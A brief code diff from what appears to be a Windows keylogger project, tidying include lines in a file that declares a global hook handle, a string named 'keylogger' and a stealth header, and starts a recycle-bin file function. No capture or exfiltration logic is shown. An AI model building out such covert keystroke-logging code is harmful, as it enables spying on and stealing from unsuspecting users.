@@ -1,14 +1,13 @@
 #include "../include/stealth.h"
 #include <fstream>
 #include "../include/IO.h"
+#include <shellapi.h>
 
 // Global variable definition
 HHOOK eHook = NULL;
 std::string keylogger = "";
 
 
-#include "../include/Stealth.h"
-#include <shellapi.h>
 
 bool move_to_recycle_bin(const std::string& filePath) {
     SHFILEOPSTRUCTA fileOp = {0};
